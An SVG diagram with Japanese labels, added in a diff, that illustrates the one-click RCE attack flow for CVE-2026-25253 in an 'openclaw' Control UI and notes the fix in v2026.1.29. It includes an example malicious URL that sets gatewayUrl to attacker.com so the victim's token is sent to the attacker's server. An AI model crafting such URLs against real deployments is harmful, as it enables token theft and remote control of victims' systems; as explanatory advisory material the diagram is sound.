@@ -1,0 +1,72 @@
+<svg viewBox="0 0 900 380" xmlns="http://www.w3.org/2000/svg" style="max-height:70vh;width:auto;display:block;margin:0 auto;letter-spacing:0;font-family:sans-serif">
+  <text x="450" y="28" text-anchor="middle" font-size="17" font-weight="bold" fill="#b71c1c">CVE-2026-25253: 1クリックRCE 攻撃フロー</text>
+
+  <!-- Attacker -->
+  <rect x="30" y="65" width="130" height="65" rx="10" fill="#ffebee" stroke="#e53935" stroke-width="2"/>
+  <text x="95" y="93" text-anchor="middle" font-size="22">😈</text>
+  <text x="95" y="118" text-anchor="middle" font-size="13" font-weight="bold" fill="#b71c1c">攻撃者</text>
+
+  <!-- Step 1: Craft URL -->
+  <rect x="30" y="165" width="130" height="55" rx="8" fill="#ffcdd2" stroke="#e53935" stroke-width="1.5"/>
+  <text x="95" y="188" text-anchor="middle" font-size="12" font-weight="bold" fill="#c62828">① 悪意ある</text>
+  <text x="95" y="207" text-anchor="middle" font-size="11" fill="#555">URLを作成</text>
+
+  <line x1="95" y1="130" x2="95" y2="165" stroke="#e53935" stroke-width="1.5"/>
+  <polygon points="89,163 95,175 101,163" fill="#e53935"/>
+
+  <!-- Malicious URL box -->
+  <rect x="180" y="55" width="340" height="80" rx="8" fill="#1a1a1a"/>
+  <text x="350" y="78" text-anchor="middle" font-size="11" fill="#f44336" font-weight="bold">悪意あるURL（例）</text>
+  <text x="200" y="98" font-size="10" fill="#69f0ae" font-family="monospace">http://openclaw.local/?</text>
+  <text x="200" y="113" font-size="10" fill="#69f0ae" font-family="monospace">gatewayUrl=http://attacker.com</text>
+  <text x="200" y="128" font-size="10" fill="#69f0ae" font-family="monospace">&amp;token=&lt;stolen&gt;</text>
+
+  <!-- Arrow from attacker to URL -->
+  <line x1="160" y1="95" x2="180" y2="95" stroke="#e53935" stroke-width="1.5"/>
+  <polygon points="178,89 190,95 178,101" fill="#e53935"/>
+
+  <!-- Victim -->
+  <rect x="560" y="65" width="130" height="65" rx="10" fill="#e8f5e9" stroke="#388e3c" stroke-width="2"/>
+  <text x="625" y="93" text-anchor="middle" font-size="22">😰</text>
+  <text x="625" y="118" text-anchor="middle" font-size="13" font-weight="bold" fill="#1b5e20">被害者</text>
+
+  <!-- Step 2: Click link -->
+  <rect x="560" y="165" width="130" height="55" rx="8" fill="#c8e6c9" stroke="#388e3c" stroke-width="1.5"/>
+  <text x="625" y="188" text-anchor="middle" font-size="12" font-weight="bold" fill="#1b5e20">② リンク</text>
+  <text x="625" y="207" text-anchor="middle" font-size="11" fill="#555">クリック</text>
+
+  <!-- Arrow: URL to victim -->
+  <line x1="520" y1="95" x2="560" y2="95" stroke="#e53935" stroke-width="2"/>
+  <polygon points="558,89 570,95 558,101" fill="#e53935"/>
+  <text x="540" y="88" text-anchor="middle" font-size="10" fill="#e53935">送信</text>
+
+  <!-- Control UI -->
+  <rect x="350" y="165" width="180" height="55" rx="8" fill="#fff9c4" stroke="#f9a825" stroke-width="1.5"/>
+  <text x="440" y="188" text-anchor="middle" font-size="12" font-weight="bold" fill="#e65100">③ Control UI</text>
+  <text x="440" y="207" text-anchor="middle" font-size="11" fill="#555">gatewayUrl 無検証</text>
+
+  <!-- Arrows to Control UI -->
+  <line x1="625" y1="165" x2="530" y2="220" stroke="#388e3c" stroke-width="1.5"/>
+  <polygon points="525,214 520,226 532,222" fill="#388e3c"/>
+  <line x1="160" y1="192" x2="350" y2="192" stroke="#e53935" stroke-width="1.5"/>
+  <polygon points="348,186 360,192 348,198" fill="#e53935"/>
+
+  <!-- Token theft -->
+  <rect x="560" y="255" width="130" height="55" rx="8" fill="#ffebee" stroke="#e53935" stroke-width="1.5"/>
+  <text x="625" y="278" text-anchor="middle" font-size="12" font-weight="bold" fill="#c62828">④ トークン</text>
+  <text x="625" y="297" text-anchor="middle" font-size="11" fill="#555">攻撃者サーバへ送信</text>
+  <line x1="530" y1="220" x2="560" y2="270" stroke="#e53935" stroke-width="2"/>
+  <polygon points="554,268 560,280 566,268" fill="#e53935"/>
+
+  <!-- RCE -->
+  <rect x="350" y="255" width="180" height="55" rx="8" fill="#b71c1c"/>
+  <text x="440" y="278" text-anchor="middle" font-size="13" font-weight="bold" fill="white">⑤ RCE 達成</text>
+  <text x="440" y="297" text-anchor="middle" font-size="11" fill="#ffcdd2">ローカルGateway制御</text>
+  <line x1="625" y1="255" x2="530" y2="282" stroke="#e53935" stroke-width="2"/>
+  <polygon points="525,276 520,288 532,284" fill="#e53935"/>
+
+  <!-- Fix badge -->
+  <rect x="30" y="295" width="280" height="50" rx="8" fill="#1b5e20"/>
+  <text x="170" y="318" text-anchor="middle" font-size="13" font-weight="bold" fill="white">修正: v2026.1.29</text>
+  <text x="170" y="337" text-anchor="middle" font-size="11" fill="#a5d6a7">gatewayUrl バリデーション追加 / CVSS 8.8</text>
+</svg>
